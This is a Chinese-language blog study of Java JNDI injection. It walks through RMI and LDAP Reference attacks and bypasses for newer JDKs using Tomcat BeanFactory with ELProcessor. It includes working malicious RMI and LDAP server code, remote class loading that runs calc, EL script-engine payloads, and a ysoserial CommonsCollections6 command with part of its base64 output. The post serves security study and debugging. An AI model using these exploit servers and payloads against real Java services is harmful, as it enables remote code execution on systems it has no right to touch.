FROM

```
https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0
```

有空跟着调试跟一遍。

---

Java Jndi 注入学习



- 主要分为几个部分吧，这里就合并到一起写了。

# Java 反序列化之 JNDI 学习

> 为什么说是 “从文档开始的 jndi 注入之路”

因为 jndi 的内容比较多，我们从官方文档去看，专挑和安全有关系的地方看。

官方文档地址：https://docs.oracle.com/javase/tutorial/jndi/overview/index.html

## 0x01 什么是 jndi

首先第一个问题，什么是 JNDI，它的作用是什么？

根据官方文档，JNDI 全称为 **Java Naming and Directory Interface**，即 Java 名称与目录接口。也就是一个名字对应一个 Java 对象。

也就是一个字符串对应一个对象。

jndi 在 jdk 里面支持以下四种服务

- LDAP：轻量级目录访问协议
- 通用对象请求代理架构(CORBA)；通用对象服务(COS)名称服务
- Java 远程方法调用(RMI) 注册表
- DNS 服务

前三种都是字符串对应对象，DNS 是 IP 对应域名。

### jndi 的代码以及包说明

JNDI 主要是上述四种服务，对应四个包加一个主包
JNDI 接口主要分为下述 5 个包:

- [javax.naming](https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/naming.html)
- [javax.naming.directory](https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/directory.html)
- [javax.naming.event](https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/event.html)
- [javax.naming.ldap](https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/ldap.html)
- [javax.naming.spi](https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/provider.html)

其中最重要的是 `javax.naming` 包，包含了访问目录服务所需的类和接口，比如 Context、Bindings、References、lookup 等。 以上述打印机服务为例，通过 JNDI 接口，用户可以透明地调用远程打印服务，伪代码如下所示:

JAVA

```
Context ctx = new InitialContext(env);
Printer printer = (Printer)ctx.lookup("myprinter");
printer.print(report);
```

Jndi 在对不同服务进行调用的时候，会去调用 xxxContext 这个类，比如调用 RMI 服务的时候就是调的 RegistryContext，这一点是很重要的，记住了这一点对于 JNDI 这里的漏洞理解非常有益。

一般的应用也就是先 `new InitialContext()`，再调用 API 即可，下面我们先看一个 JNDI 结合 RMI 的代码实例。

## 0x02 JNDI 的利用方式，代码以及一些漏洞

### 1. Jndi 结合 RMI

新建一个项目，把服务端和客户端分开，代码如下。

- RemoteObj 的接口以及接口的实现类和 RMI 里面都是一样的，这里就不贴了。

**JNDIRMIServer.java**

JAVA

```
import javax.naming.InitialContext;  
import java.rmi.registry.LocateRegistry;  
import java.rmi.registry.Registry;  
  
public class JNDIRMIServer {  
    public static void main(String[] args) throws Exception{  
        InitialContext initialContext = new InitialContext();  
 Registry registry = LocateRegistry.createRegistry(1099);  
 initialContext.rebind("rmi://localhost:1099/remoteObj", new RemoteObjImpl());  
 }  
}
```

**JNDIRMIClient.java**

JAVA

```
import javax.naming.InitialContext;  
  
public class JNDIRMIClient {  
    public static void main(String[] args) throws Exception{  
        InitialContext initialContext = new InitialContext();  
 RemoteObj remoteObj = (RemoteObj) initialContext.lookup("rmi://localhost:1099/remoteObj");  
 System.out.println(remoteObj.sayHello("hello"));  
 }  
}
```

#### RMI 原生漏洞

这里的 api 虽然是 JNDI 的服务的，但是实际上确实调用到 RMI 的库里面的，这里我们先打断点调试一下，证明 JNDI 的 api 实际上是调用了 RMI 的库里原生的 `lookup()` 方法。

这里先分析一边，后续我们再到这个过程的时候就光速跳过了 ~

断点的话，下一个在 `InitialContext.java` 的 `lookup()` 方法这里即可，开始调试。

![img](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/lookup01.png)

进到 `lookup()` 方法里面进去，这里 `GenericURLContext` 类的 `lookup()` 方法里面又套了一个 `lookup()` 方法，我们继续进去。

![img](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/lookup02.png)

进去之后发现这个类是 `RegistryContext`，也就是 RMI 对应 `lookup()` 方法的类，至此，可以基本说明**JNDI 调用 RMI 服务的时候，虽然 API 是 JNDI 的，但是还是去调用了原生的 RMI 服务。**

![img](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/RegistryContext.png)

- 所以说，如果 JNDI 这里是和 RMI 结合起来使用的话，RMI 中存在的漏洞，JNDI 这里也会有。但这并不是 JNDI 的传统意义上的漏洞。

#### 引用的漏洞，Normal Jndi

- 这个漏洞被称作 Jndi 注入漏洞，它与所调用服务无关，不论你是 RMI，DNS，LDAP 或者是其他的，都会存在这个问题。

原理是在服务端调用了一个 `Reference` 对象，我个人的理解，它是很像代理的。

代码如下

JAVA

```
import javax.naming.InitialContext;  
import javax.naming.Reference;  
import java.rmi.registry.LocateRegistry;  
import java.rmi.registry.Registry;  
  
public class JNDIRMIServer {  
    public static void main(String[] args) throws Exception{  
        InitialContext initialContext = new InitialContext();  
 Registry registry = LocateRegistry.createRegistry(1099);  
 // RMI  
 // initialContext.rebind("rmi://localhost:1099/remoteObj", new RemoteObjImpl()); // JNDI 注入漏洞  
 Reference reference = new Reference("Calc","Calc","http://localhost:7777/");  
 initialContext.rebind("rmi://localhost:1099/remoteObj", reference);  
 }  
}
```

我们看到这个地方，原本我们是这样的

JAVA

```
initialContext.rebind("rmi://localhost:1099/remoteObj", new RemoteObjImpl());
```

直接是绑定了一个对象，而在 jndi 里面，我们可以通过 new 一个 Reference 类的方法来解决。然后再 rebind 调用它，这个思路有点像代理吧，然后调用它这个很像 URLClassLoader。有兴趣的师傅可以跟一下断点。

如果要攻击的话，也很简单，我们在 URLClassLoader 这个获取的方法里面添加恶意类就可以了，比如我这里是 Calc.exe 这个恶意命令调用，代码如下

JAVA

```
public class JndiCalc {  
    public JndiCalc() throws Exception {  
        Runtime.getRuntime().exec("calc");  
 }  
}
```

用 Python 起一个服务器，然后再运行即可。

![img](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/SuccessNormalJNDI.png)

报错的话是一定会报错的，因为服务端这里还是 sayHello 了，但是我们调用的那个远程 Class —————— reference 其实是没有 sayHello 这个方法的。

这里我们可以打断点调试一下。

- 断点打在 Client 中调用 `lookup()` 方法的地方，开始调试。

因为漏洞点在 `lookup()` 方法这里，所以我们是要去看 `lookup()` 方法的一整个流程，看一下是怎么触发恶意类，然后命令执行的。

跟进几个 `lookup()` 方法，直到去到 RMI 的原生的 `lookup()`，对应的类我也在前文提及过了，是 `RegistryContext`

![img](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/RegistryContextLookup.png)

继续往下走，这里 var2 对应的是 obj 变量，把 Ref 的值赋给了它。obj 是一个 `ReferenceWrapper_Stub` 这个类，是因为这是一个 Reference，有兴趣的师傅可以看一下原理，也比较简单。

![img](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/ReferenceWrapper.png)

然后继续往下走，从 `decodeObject()` 方法进去。

![img](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/decodeObject.png)

先做了一个简单的判断，判断是否为 `ReferenceWrapper`，也就是判断是否为 `Reference` 对象。往下是一个比较重要的方法 `getOBjectInstance()`，从名字上推测这应该是一个初始化的方法。跟进

![img](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/getObjectInstance.png)

噢对这里不得不提一下 `Reference` 这个类的构造函数，前文忘记说了，愚蠢的我…………

![img](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/Reference.png)

第一个参数是类名，第二个参数是 factory，我觉得 factory 是 Jndi 很好的一个表示，我们可以通过这一个 factory 来代表一个类；第三个参数为地址，这个简单。

回到正题来，这里到了 `getObjectInstance()` 这个方法，首先是 `builder` 的判断，不知道这是啥，注释中写着 “// Use builder if installed”，我这里应该是没用，直接跳过判断。

往下走，是关于 reference 的，这里肯定是用了 reference，强转换，将 `refInfo` 转换为 `Reference`。

![img](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/builderAndReference.png)

继续往下走，是关于 ref 的，意思是如果 reference 当中定义了 factory，就通过 `getObjectFactoryFromReference()` 方法来调用 reference 当中的 factory。

![img](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/getObjectFactoryFromReference.png)

`getObjectFactoryFromReference()` 这个方法中，我们已经获取到了这个恶意类，接着执行加载类的 `loadClass()` 方法。

继续往下走，获取到 codebase，并且进行 helper.loadClass()，这里就是我们前面讲到的动态加载类的一个方法 ———— URLClassLoader

![img](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/loadClass.png)

最后在 newInstance() 这一步执行代码。

![img](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/newInstance.png)

- 总结一下还是比较简单的，就是 URLClassLoader 的动态类加载，但是讲道理，这个地方是 Jndi 专属的，不是说因为 RMI 的问题。

然后攻击点的话，就是因为客户端进行了 `lookup()` 方法的调用。

这个漏洞在 jdk8u121 当中被修复，也就是 `lookup()` 方法只可以对本地进行 `lookup()` 方法的调用。

### 2. Jndi 结合 ldap

#### ldap

- ldap 是一种协议，并不是 Java 独有的。

LDAP 既是一类服务，也是一种协议，定义在 [RFC2251](http://www.ietf.org/rfc/rfc2251.txt)([RFC4511](https://datatracker.ietf.org/doc/rfc4511/)) 中，是早期 X.500 DAP (目录访问协议) 的一个子集，因此有时也被称为 **X.500-lite**。

LDAP Directory 作为一种目录服务，主要用于带有条件限制的对象查询和搜索。目录服务作为一种特殊的数据库，用来保存描述性的、基于属性的详细信息。和传统数据库相比，最大的不同在于目录服务中数据的组织方式，它是一种有层次的树形结构，因此它有优异的读性能，但写性能较差，并且没有事务处理、回滚等复杂功能，不适于存储修改频繁的数据。

LDAP 的请求和响应是 **ASN.1** 格式，使用二进制的 BER 编码，操作类型(Operation)包括 Bind/Unbind、Search、Modify、Add、Delete、Compare 等等，除了这些常规的增删改查操作，同时也包含一些拓展的操作类型和异步通知事件。

#### ldap 的 JNDI 漏洞

先起一个 LDAP 的服务，这里需要先在 pom.xml 中导入 `unboundid-ldapsdk` 的依赖。

XML

```
<dependency>  
 <groupId>com.unboundid</groupId>  
 <artifactId>unboundid-ldapsdk</artifactId>  
 <version>3.2.0</version>  
 <scope>test</scope>  
</dependency>
```

对应的 server 的代码

**LdapServer.java**

JAVA

```
import com.unboundid.ldap.listener.InMemoryDirectoryServer;  
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;  
import com.unboundid.ldap.listener.InMemoryListenerConfig;  
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;  
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;  
import com.unboundid.ldap.sdk.Entry;  
import com.unboundid.ldap.sdk.LDAPException;  
import com.unboundid.ldap.sdk.LDAPResult;  
import com.unboundid.ldap.sdk.ResultCode;  
import javax.net.ServerSocketFactory;  
import javax.net.SocketFactory;  
import javax.net.ssl.SSLSocketFactory;  
import java.net.InetAddress;  
import java.net.MalformedURLException;  
import java.net.URL;  
  
public class LdapServer {  
    private static final String LDAP_BASE = "dc=example,dc=com";  
 public static void main (String[] args) {  
        String url = "http://127.0.0.1:8000/#EvilObject";  
 int port = 1234;  
 try {  
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);  
 config.setListenerConfigs(new InMemoryListenerConfig(  
                    "listen",  
 InetAddress.getByName("0.0.0.0"),  
 port,  
 ServerSocketFactory.getDefault(),  
 SocketFactory.getDefault(),  
 (SSLSocketFactory) SSLSocketFactory.getDefault()));  
  
 config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));  
 InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);  
 System.out.println("Listening on 0.0.0.0:" + port);  
 ds.startListening();  
 }  
        catch ( Exception e ) {  
            e.printStackTrace();  
 }  
    }  
    private static class OperationInterceptor extends InMemoryOperationInterceptor {  
        private URL codebase;  
 /**  
 * */ public OperationInterceptor ( URL cb ) {  
            this.codebase = cb;  
 }  
        /**  
 * {@inheritDoc}  
 * * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)  
 */ @Override  
 public void processSearchResult ( InMemoryInterceptedSearchResult result ) {  
            String base = result.getRequest().getBaseDN();  
 Entry e = new Entry(base);  
 try {  
                sendResult(result, base, e);  
 }  
            catch ( Exception e1 ) {  
                e1.printStackTrace();  
 }  
        }  
        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {  
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));  
 System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);  
 e.addAttribute("javaClassName", "Exploit");  
 String cbstring = this.codebase.toString();  
 int refPos = cbstring.indexOf('#');  
 if ( refPos > 0 ) {  
                cbstring = cbstring.substring(0, refPos);  
 }  
            e.addAttribute("javaCodeBase", cbstring);  
 e.addAttribute("objectClass", "javaNamingReference");  
 e.addAttribute("javaFactory", this.codebase.getRef());  
 result.sendSearchEntry(e);  
 result.setResult(new LDAPResult(0, ResultCode.SUCCESS));  
 }  
  
    }  
}
```

客户端这里和上面是差不多的，只是把服务替换成了 ldap

**JNDILdapClient.java**

JAVA

```
import javax.naming.InitialContext;  
  
public class JNDILdapClient {  
    public static void main(String[] args) throws Exception{  
        InitialContext initialContext = new InitialContext();  
 RemoteObj remoteObj = (RemoteObj) initialContext.lookup("ldap://localhost:1099/remoteObj");  
 System.out.println(remoteObj.sayHello("hello"));  
 }  
}
```

先用 python 起一个 HTTP 服务，再跑服务端代码，再跑客户端。

运行结果如图。

![img](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/LdapSuccess.png)

- 这个攻击就还是我们之前说的 Reference

注意一点就是，LDAP+Reference的技巧远程加载Factory类不受RMI+Reference中的com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制，所以适用范围更广。但在JDK 8u191、7u201、6u211之后，com.sun.jndi.ldap.object.trustURLCodebase属性的默认值被设置为false，对LDAP Reference远程工厂类的加载增加了限制。

所以，当JDK版本介于8u191、7u201、6u211与6u141、7u131、8u121之间时，我们就可以利用LDAP+Reference的技巧来进行JNDI注入的利用。

因此，这种利用方式的前提条件就是目标环境的JDK版本在JDK8u191、7u201、6u211以下。

### 3. jndi 结合 CORBA

一个简单的流程是：`resolve_str` 最终会调用到 `StubFactoryFactoryStaticImpl.createStubFactory` 去加载远程 class 并调用 newInstance 创建对象，其内部使用的 ClassLoader 是 `RMIClassLoader`，在反序列化 stub 的上下文中，默认不允许访问远程文件，因此这种方法在实际场景中比较少用。所以就不深入研究了。

## 0x03 绕过高版本 jdk 的攻击

> 针对的就是 jdk8u121、7u201 这些的高版本 jdk 的绕过手段。

### 1. jdk 版本在 8u191 之前的绕过手段

这里的 jdk 版本是 **jdk8u121 < temp < jdk8u191**；才可以打。

绕过方法很简单，就是我们上面说的 ldap 的 JNDI 漏洞，其实这也无关 ldap。通过 RMI 也是可以打的，这也就是 JNDI 通用漏洞，原因是可以动态加载字节码，分析过程和上面是一样的，也有断点，这里就不赘述了。

- 然后我们集中看一下 jdk8u191 之后的版本对于这个漏洞是通过什么手段来修复的。

**修复手段源码**

JAVA

```
// 旧版本JDK  
 /**  
 * @param className A non-null fully qualified class name.  
 * @param codebase A non-null, space-separated list of URL strings.  
 */  
 public Class<?> loadClass(String className, String codebase)  
 throws ClassNotFoundException, MalformedURLException {  
  
 ClassLoader parent = getContextClassLoader();  
 ClassLoader cl =  
 URLClassLoader.newInstance(getUrlArray(codebase), parent);  
  
 return loadClass(className, cl);  
 }  
  
  
// 新版本JDK  
 /**  
 * @param className A non-null fully qualified class name.  
 * @param codebase A non-null, space-separated list of URL strings.  
 */  
 public Class<?> loadClass(String className, String codebase)  
 throws ClassNotFoundException, MalformedURLException {  
 if ("true".equalsIgnoreCase(trustURLCodebase)) {  
 ClassLoader parent = getContextClassLoader();  
 ClassLoader cl =  
 URLClassLoader.newInstance(getUrlArray(codebase), parent);  
  
 return loadClass(className, cl);  
 } else {  
 return null;  
 }  
 }
```

**在使用 `URLClassLoader` 加载器加载远程类之前加了个if语句检测**

根据 `trustURLCodebase的值是否为true` 的值来进行判断，它的值默认为 false。通俗的来说，jdk8u191 之后的版本通过添加 `trustURLCodebase 的值是否为 true` 这一手段，让我们无法加载 codebase，也就是无法让我们进行 URLClassLoader 的攻击了。

下面我们来讲 jdk8u191 版本之后的绕过手段。

### 2. jdk 版本在 8u191 之后的绕过方式

> 这里我们主要的攻击方式是 **利用本地恶意 Class 作为Reference Factory**

#### 绕过手法一、利用本地恶意 Class 作为 Reference Factory

简单地说，就是要服务端本地 ClassPath 中存在恶意 Factory 类可被利用来作为 Reference Factory 进行攻击利用。该恶意 Factory 类必须实现 `javax.naming.spi.ObjectFactory` 接口，实现该接口的 getObjectInstance() 方法。

大佬找到的是这个 `org.apache.naming.factory.BeanFactory` 类，其满足上述条件并存在于 Tomcat8 依赖包中，应用广泛。该类的 `getObjectInstance()` 函数中会通过反射的方式实例化 Reference 所指向的任意 Bean Class(Bean Class 就类似于我们之前说的那个 CommonsBeanUtils 这种)，并且会调用 setter 方法为所有的属性赋值。而该 Bean Class 的类名、属性、属性值，全都来自于 Reference 对象，均是攻击者可控的。

现在来看下RMI攻击向量的代码是如何实现的。

**攻击利用**

具体依赖 Tomcat 中的 jar 包为：catalina.jar、el-api.jar、jasper-el.jar。

**恶意服务端代码 JNDIBypassHighJava.java**

JAVA

```
import com.sun.jndi.rmi.registry.ReferenceWrapper;  
import org.apache.naming.ResourceRef;  
  
import javax.naming.StringRefAddr;  
import java.rmi.registry.LocateRegistry;  
import java.rmi.registry.Registry;  
  
// JNDI 高版本 jdk 绕过服务端  
public class JNDIBypassHighJava {  
    public static void main(String[] args) throws Exception {  
        System.out.println("[*]Evil RMI Server is Listening on port: 1099");  
 Registry registry = LocateRegistry.createRegistry( 1099);  
 // 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory  
 ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "",  
 true,"org.apache.naming.factory.BeanFactory",null);  
 // 强制将'x'属性的setter从'setX'变为'eval', 详细逻辑见BeanFactory.getObjectInstance代码  
 ref.add(new StringRefAddr("forceString", "x=eval"));  
 // 利用表达式执行命令  
 ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +  
                ".newInstance().getEngineByName(\"JavaScript\")" +  
                ".eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['calc']).start()\")"));  
 System.out.println("[*]Evil command: calc");  
 ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);  
 registry.bind("Object", referenceWrapper);  
 }  
}
```

呃，讲道理，这里还有一个用 rebind 方法的服务端，代码如下。

JAVA

```
import org.apache.naming.ResourceRef;  
  
import javax.naming.InitialContext;  
import javax.naming.StringRefAddr;  
  
public class JNDIBypassHighJavaServerRebind {  
    public static void main(String[] args) throws Exception{  
  
        InitialContext initialContext = new InitialContext();  
 ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor",null,"","",  
 true,"org.apache.naming.factory.BeanFactory",null );  
 resourceRef.add(new StringRefAddr("forceString", "x=eval"));  
 resourceRef.add(new StringRefAddr("x","Runtime.getRuntime().exe('calc')" ));  
 initialContext.rebind("rmi://localhost:1099/remoteObj", resourceRef);  
 }  
}
```

JNDI 客户端：

JAVA

```
import javax.naming.Context;  
import javax.naming.InitialContext;  
  
public class JNDIBypassHighJavaClient {  
    public static void main(String[] args) throws Exception {  
        String uri = "rmi://localhost:1099/Object";  
 Context context = new InitialContext();  
 context.lookup(uri);  
 }  
}
```

执行效果：

![img](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/HighJDK.png)

- 看完了 EXP，我们来分析一下服务端的代码，就以简短一点的 rebind 为例分析。

首先 `ELProcessor` 这里，是 el 表达式，我太菜了还不会，它是一种命令执行的方式。具体的解释也写在注释里面了。

后面的 add 这种写法是 `BeanFactory.getObjectInstance()` 代码的逻辑，第一种命令执行的方式是 ProcessBuilder 的，第二种是 Runtime 的。

##### 调试分析运行流程

开始调试，进 lookup 这里和之前是一样的，我就直接跳过了，直接到 `RegistryContext` 这个类的 `decodeObject()` 方法当中，这个方法当中调用了 `getObjectInstance()`

![img](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/getObjectInstance.png)

继续往前，不一样的地方在 `getObjectFactoryFromReference`，我们也可以直接把断点下在这个位置，这样就可以直达了。

![img](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/getObjectFactoryFromReferenceDebug.png)

跟进去看一下逻辑，发现是通过 `loadClass()` 方法来加载我们传入的 `org.apache.naming.factory.BeanFactory` 类，然后新建该类实例并将其转换成 `ObjectFactory` 类型，也就是说，**我们传入的 Factory 类必须实现 ObjectFactory 接口类、而 `org.apache.naming.factory.BeanFactory` 正好满足这一点**：

![img](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/clasJudge.png)

继续往下走，跟进看到 `getObjectInstance()` 方法中，会判断 obj 参数是否是 `ResourceRef` 类实例，是的话代码才会往下走，**这就是为什么我们在恶意 RMI 服务端中构造 Reference 类实例的时候必须要用 Reference 类的子类 ResourceRef 类来创建实例**：

![img](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/ResourceRef.png)

后续经过一系列的赋值，执行 loadClass 方法，然后继续。接着获取 Bean 类为 `javax.el.ELProcessor` 后，实例化该类并获取其中的 `forceString` 类型的内容，其值是我们构造的 `x=eval` 内容：

这个思路有点像 python pickle 反序列化的那个，会挤掉一个字符。

![img](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/forceString.png)

继续往下调试可以看到，查找 `forceString` 的内容中是否存在”=”号，不存在的话就调用属性的默认 setter 方法，存在的话就取键值、其中键是属性名而对应的值是其指定的 setter 方法。如此，**之前设置的 `forceString` 的值就可以强制将 x 属性的 setter 方法转换为调用我们指定的 eval() 方法了，这是 `BeanFactory` 类能进行利用的关键点！**之后，就是获取 beanClass 即 `javax.el.ELProcessor` 类的 eval() 方法并和 x 属性一同缓存到 forced 这个 HashMap 中：

![img](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/put.png)

接着是多个 do while 语句来遍历获取 ResourceRef 类实例 addr 属性的元素，当获取到 addrType 为 x 的元素时退出当前所有循环，然后调用 `getContent()` 方法来获取x属性对应的 contents 即恶意表达式。这里就是恶意 RMI 服务端中 ResourceRef 类实例添加的第二个元素：

![img](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/doWhile.png)

获取到类型为x对应的内容为恶意表达式后，从前面的缓存forced中取出key为x的值即javax.el.ELProcessor类的eval()方法并赋值给method变量，最后就是通过method.invoke()即反射调用的来执行
`"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("new java.lang.ProcessBuilder['(java.lang.String[])'](['calc']).start()")`：

![img](https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/invoke.png)

##### 小结一下本地恶意 Class

有两个点，一个是 payload 这里，是比较复杂的，经过第一层的 `=x`，之后，有添加元素的逻辑。算是 el 表达式注入的一些基础吧，后续学了 el 表达式再回来看应该会简单很多。

另外一个是原理，就是绕过了 `trustURLCodebase` 的检测，或者说轮不到 `trustURLCodebase` 来检测。

#### 绕过手法二、利用 LDAP 返回序列化数据，触发本地 Gadget

- 因为 LDAP + Reference 的路子是走不通的，完美思考用链子的方式进行攻击。

LDAP 服务端除了支持 JNDI Reference 这种利用方式外，还支持直接返回一个序列化的对象。如果 Java 对象的 javaSerializedData 属性值不为空，则客户端的 `obj.decodeObject()` 方法就会对这个字段的内容进行反序列化。此时，如果服务端 ClassPath 中存在反序列化咯多功能利用 Gadget 如 CommonsCollections 库，那么就可以结合该 Gadget 实现反序列化漏洞攻击。

这也就是平常 JNDI 漏洞存在最多的形式，通过与其他链子结合，比如当时 2022 蓝帽杯，好像有道题目就是 fastjson 绕过高版本 jdk 攻击。

使用 ysoserial 工具生成 Commons-Collections 这条 Gadget 并进行 Base64 编码输出：

当然，这个用自己的 EXP 输出也行。

JAVA

```
java -jar ysoserial-master.jar CommonsCollections6 'calc' | base64
```

输出

```
rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdG